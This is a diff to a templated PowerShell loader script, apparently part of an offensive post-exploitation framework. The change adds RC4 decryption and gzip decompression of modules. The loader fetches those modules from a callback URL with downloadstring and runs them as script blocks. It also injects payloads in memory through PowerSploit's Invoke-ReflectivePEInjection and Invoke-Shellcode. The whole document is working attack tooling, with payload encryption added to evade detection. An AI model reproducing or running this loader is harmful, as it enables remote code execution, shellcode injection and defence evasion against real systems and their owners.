@@ -1,5 +1,6 @@
 $ErrorActionPreference = "Stop"
-$fsdfds_URL = "{{callback_url}}"
+$CALLBACK_URL = "{{callback_url}}"
+$KEY = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")
 
 Write-Host @"
   _____   _____  _  _  _ _______  ______ _     _ _     _ ______
@@ -26,11 +27,68 @@ $Modules = @()
 $m = new-object System.Collections.Hashtable
 $m.add('name', '{{ m.name }}')
 $m.add('type', '{{ m.type }}')
-$m.add('code', '{{ m.code|safe }}')
+$m.add('code', '')
 $m.add('n', {{ m.n }})
 $Modules += $m
 {% endfor %}
 {% endif %}
+
+function Decrypt-Code {
+    # RC4
+    param(
+        [Byte[]]$buffer,
+        [Byte[]]$key
+  	)
+
+    $s = New-Object Byte[] 256;
+    $k = New-Object Byte[] 256;
+
+    for ($i = 0; $i -lt 256; $i++)
+    {
+        $s[$i] = [Byte]$i;
+        $k[$i] = $key[$i % $key.Length];
+    }
+
+    $j = 0;
+    for ($i = 0; $i -lt 256; $i++)
+    {
+        $j = ($j + $s[$i] + $k[$i]) % 256;
+        $temp = $s[$i];
+        $s[$i] = $s[$j];
+        $s[$j] = $temp;
+    }
+
+    $i = $j = 0;
+    for ($x = 0; $x -lt $buffer.Length; $x++)
+    {
+        $i = ($i + 1) % 256;
+        $j = ($j + $s[$i]) % 256;
+        $temp = $s[$i];
+        $s[$i] = $s[$j];
+        $s[$j] = $temp;
+        [int]$t = ($s[$i] + $s[$j]) % 256;
+        $buffer[$x] = $buffer[$x] -bxor $s[$t];
+    }
+
+    $buffer
+}
+
+function Unzip-Code {
+    [CmdletBinding()]
+        Param (
+                [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
+                [byte[]] $byteArray = $(Throw("-byteArray is required"))
+              )
+
+     $input = New-Object System.IO.MemoryStream( , $byteArray )
+	 $output = New-Object System.IO.MemoryStream
+     $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
+     $gzipStream.CopyTo( $output )
+     $gzipStream.Close()
+     $input.Close()
+     [byte[]] $byteOutArray = $output.ToArray()
+     $byteOutArray
+}
 
 function Import-HubModule {
 
@@ -40,8 +98,12 @@ function Import-HubModule {
     )
 
     if ($Module["type"] -eq "ps1") {
-        $b64 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Module["code"]))
-        $sb = [Scriptblock]::Create($b64)
+        $code = $Module["code"]
+        $code = [System.Convert]::FromBase64String($code)
+        $code = Decrypt-Code $code $KEY
+        $code = Unzip-Code $code
+        $code = [System.Text.Encoding]::ASCII.GetString($code)
+        $sb = [Scriptblock]::Create($code)
         New-Module -ScriptBlock $sb | Out-Null
     }
 
@@ -148,7 +210,7 @@ Use the '-Verbose' option to print detailed information.
     $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
     foreach ($i in $indices) {
         if ($i -lt $Modules.length -and $i -ge 0) {
-            $Modules[$i]["code"] = $K.downloadstring(("{0}?m={1}" -f $fsdfds_URL,$i));
+            $Modules[$i]["code"] = $K.downloadstring(("{0}?m={1}" -f $CALLBACK_URL,$i));
             Import-HubModule $Modules[$i]
         }
     }
@@ -164,8 +226,11 @@ function Run-Exe {
 
     if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)
     {
-        $b64 = [System.Convert]::FromBase64String($Modules[$n]["code"])
-        Invoke-ReflectivePEInjection -PEBytes $b64 -ForceASLR
+        $code = $Modules[$n]["code"]
+        $code = [System.Convert]::FromBase64String($code)
+        $code = Decrypt-Code $code $KEY
+        $code = Unzip-Code $code
+        Invoke-ReflectivePEInjection -PEBytes $code -ForceASLR
     } else {
         Write-Host "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
     }
@@ -184,11 +249,14 @@ function Run-Shellcode {
 
     if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
     {
-        $b64 = [System.Convert]::FromBase64String($Modules[$n]["code"])
+        $code = $Modules[$n]["code"]
+        $code = [System.Convert]::FromBase64String($code)
+        $code = Decrypt-Code $code $KEY
+        $code = Unzip-Code $code
         if ($ProcessID) {
-            Invoke-Shellcode -Shellcode $b64 $ProcessID
+            Invoke-Shellcode -Shellcode $code $ProcessID
         } else {
-            Invoke-Shellcode -Shellcode $b64
+            Invoke-Shellcode -Shellcode $code
         }
     } else {
         Write-Host "[-] PowerSploit's Invoke-Shellcode not available. You need to load it first."
